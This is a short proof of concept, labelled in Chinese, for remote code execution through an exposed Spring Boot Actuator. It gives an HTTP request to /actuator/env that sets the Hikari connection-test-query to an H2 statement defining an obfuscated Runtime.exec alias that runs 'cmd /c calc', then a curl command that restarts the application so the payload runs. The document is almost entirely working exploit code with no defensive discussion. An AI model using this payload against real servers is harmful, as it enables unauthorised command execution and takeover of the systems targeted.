## PoC
1. 设置环境变量
```
POST /actuator/env HTTP/1.1
Host: localhost:8080
Content-Type: application/json

{"name":"spring.datasource.hikari.connection-test-query","value":"CREATE ALIAS T5 AS CONCAT('void ex(String m1,String m2,String m3)throws Exception{Runti','me.getRun','time().exe','c(new String[]{m1,m2,m3});}');CALL T5('cmd','/c','calc');"}
```
2. 重启应用
`curl -X POST localhost:8080/actuator/restart -H 'Content-Type: application/json'`